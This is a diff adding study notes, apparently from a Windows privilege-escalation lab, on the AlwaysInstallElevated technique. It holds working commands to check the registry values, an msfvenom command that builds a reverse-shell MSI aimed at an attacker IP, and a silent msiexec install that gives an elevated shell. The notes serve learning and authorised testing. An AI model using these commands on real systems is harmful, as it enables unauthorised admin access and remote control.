@@ -14,3 +14,18 @@ We then start a listener on the attacker machine on the same port we indicated o
 The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. 
 
 AlwaysInstallElevated:
+Windows installer files (also known as .msi files) are used to install applications on the system. 
+They usually run with the privilege level of the user that starts it.
+However, these can be configured to run with higher privileges from any user account (even unprivileged ones). 
+This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+This method requires two registry values to be set. You can query these from the command line using the commands below:
+1. C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+2. C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.
+If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
+3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.107.134 LPORT=LOCAL_PORT -f msi -o malicious.msi
+Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
+4. msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+
+
